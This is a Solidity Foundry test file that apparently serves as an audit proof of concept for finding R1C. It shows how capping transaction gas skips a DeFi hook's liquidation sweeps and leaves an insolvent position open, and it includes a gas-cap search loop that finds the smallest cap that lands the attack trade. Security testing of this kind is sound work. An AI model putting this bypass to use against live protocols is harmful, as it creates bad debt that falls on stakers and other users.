// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {YBase} from "./YBase.sol";
import {PerpSwapLib} from "../../cauldron/PerpSwapLib.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {console2} from "forge-std/console2.sol";

/**
 *  R1C — THE WHOLE LIQUIDATION ENGINE IS OPTIONAL: THE CALLER PICKS THE GAS.
 *
 *  CauldronHook.sol:161  `uint256 internal constant LIQ_GAS_RESERVE = 180_000;`
 *  CauldronHook.sol:172  `uint256 internal constant LIQ_GAS_MIN = 400_000;`
 *  CauldronHook.sol:791-799
 *      function _liqSweep(address sender, int256 amountSpecified, bool isBuy, uint160 limit) private {
 *          if (perpEngine == address(0) || sender == perpEngine) return;
 *          uint256 reserve = amountSpecified != 0 ? LIQ_GAS_RESERVE + LIQ_GAS_MIN : LIQ_GAS_RESERVE;
 *          uint256 g = gasleft();
 *          if (g > reserve + LIQ_GAS_MIN) { ... }
 *      }
 *
 *  The pre-trade sweep needs gasleft() > 980_000 and the post-trade sweep needs
 *  gasleft() > 580_000, but the bare swap itself costs ~104k (the hook's own note
 *  at CauldronHook.sol:165). A swapper who caps the transaction's gas below those
 *  floors executes a full-size trade with BOTH sweeps silently skipped.
 *
 *  I1 (staker safety): after any single swap, no OPEN position is insolvent at the
 *  realized post-trade price.
 */
contract R1C_GasFloorBypass is YBase {
    uint256 internal vid;
    uint256 internal vSize;
    uint256 internal vPrin;

    bool internal ran;
    bool internal swapOk;
    bool internal survived;
    bool internal insolvent;
    uint256 internal gap;
    uint256 internal gasUsedCap;

    bool internal ranPos;
    bool internal survivedPos;
    bool internal insolventPos;

    function setUp() public {
        _boot(60 ether, 0);
        if (!active) return;
        _bootPerp(40 ether, 400_000_000 ether);
    }

    function _tokensFor(uint256 ethAmt) internal view returns (uint256) {
        uint256 v = PerpSwapLib.quoteAt(1e18, uint256(_sqrtP()));
        if (v == 0) return 0;
        return (ethAmt * 1e18) / v;
    }

    function _openVictim() internal {
        vm.prank(victim);
        vid = perp.openLong{value: 1 ether}(2, 0, 0, 1 ether);
        (, , , uint256 s, uint256 p, , , ) = perp.positions(vid);
        vSize = s;
        vPrin = p;
    }

    /// @dev A sell executed under an explicit transaction gas cap.
    function _sellWithGas(uint256 tokenIn, uint256 gasCap) internal returns (bool ok) {
        bytes memory data = abi.encode(
            OP_SWAP, abi.encode(YSwap(false, -int256(tokenIn), attacker, address(this))), _key()
        );
        (ok, ) = address(pm).call{gas: gasCap}(
            abi.encodeWithSelector(IPoolManager.unlock.selector, data)
        );
    }

    function _state() internal view returns (bool surv, bool ins, uint256 g) {
        (address t, , , , , , , ) = perp.positions(vid);
        surv = (t != address(0));
        uint256 val = PerpSwapLib.quoteAt(vSize, uint256(_sqrtP()));
        ins = val < vPrin;
        g = ins ? vPrin - val : 0;
    }

    /// @dev Find the smallest gas cap that still lands the crash trade, then report
    ///      whether the victim survived it insolvent.
    function _search() internal {
        uint256 tokenIn = _tokensFor(45 ether);
        for (uint256 cap = 500_000; cap <= 1_400_000; cap += 50_000) {
            uint256 snap = vm.snapshotState();
            deal(token, attacker, tokenIn, true);
            bool ok = _sellWithGas(tokenIn, cap);
            (bool s, bool i, uint256 g) = _state();
            console2.log("gasCap", cap, "swapOk", ok);
            console2.log("   survived", s, "insolvent", i);
            vm.revertToState(snap);
            if (ok && s && i) {
                gasUsedCap = cap;
                swapOk = true;
                survived = s;
                insolvent = i;
                gap = g;
                return;
            }
            if (ok) { gasUsedCap = cap; swapOk = true; survived = s; insolvent = i; gap = g; }
        }
    }

    /// POSITIVE CONTROL: with an ordinary (uncapped) gas budget the pre-emptive
    /// sweep fires and the victim is closed before the crash. PASSES.
    function test_R1C_positive_uncapped_gas_preempts() public {
        if (active) {
            _openVictim();
            uint256 tokenIn = _tokensFor(45 ether);
            deal(token, attacker, tokenIn, true);
            _sell(tokenIn, attacker);
            (bool s, bool i, ) = _state();
            survivedPos = s;
            insolventPos = i;
            ranPos = true;
        }
        console2.log("ranPos", ranPos, "survivedPos", survivedPos);
        assertTrue(ranPos, "fork not active");
        assertFalse(survivedPos && insolventPos, "I1 holds at full gas");
    }

    /// ATTACK: the same trade under a gas cap skips both sweeps. FAILS.
    function test_R1C_gas_capped_swap_skips_both_sweeps() public {
        if (active) {
            _openVictim();
            _search();
            ran = true;
        }
        console2.log("ran", ran, "swapOk", swapOk);
        console2.log("gasCap", gasUsedCap);
        console2.log("survived", survived, "insolvent", insolvent);
        console2.log("badDebtGapWei", gap);
        assertTrue(ran, "fork not active - PoC proved nothing");
        assertTrue(swapOk, "no gas cap landed the trade");
        assertFalse(
            survived && insolvent,
            "I1 BROKEN: gas-capped swap left an insolvent position open"
        );
    }
}
